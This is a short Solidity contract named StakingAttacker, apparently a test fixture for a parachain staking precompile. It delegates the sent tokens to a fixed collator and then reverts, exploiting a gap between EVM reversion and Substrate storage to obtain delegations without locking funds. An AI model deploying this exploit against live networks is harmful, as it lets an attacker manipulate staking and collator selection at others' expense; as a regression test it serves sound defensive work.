// SPDX-License-Identifier: GPL-3.0-only
pragma solidity >=0.8.0;

import "../../../precompiles/parachain-staking/StakingInterface.sol";

contract StakingAttacker {
    /// The collator (ALITH) that this contract will benefit with delegations
    address public target = 0xf24FF3a9CF04c71Dbc94D0b566f7A27B94566cac;

    /// The ParachainStaking wrapper at the known pre-compile address.
    ParachainStaking public staking =
        ParachainStaking(0x0000000000000000000000000000000000000800);

    /// Take advantage of the EVMs reversion logic and the fact that it doesn't extend to
    /// Substrate storage to score free delegations for a collator candidate of our choosing
    function score_a_free_delegation() public payable {
        // We delegate our target collator with all the tokens provided
        staking.delegate(target, msg.value, 1, 1);
        revert(
            "By reverting this transaction, we return the eth to the caller"
        );
    }
}
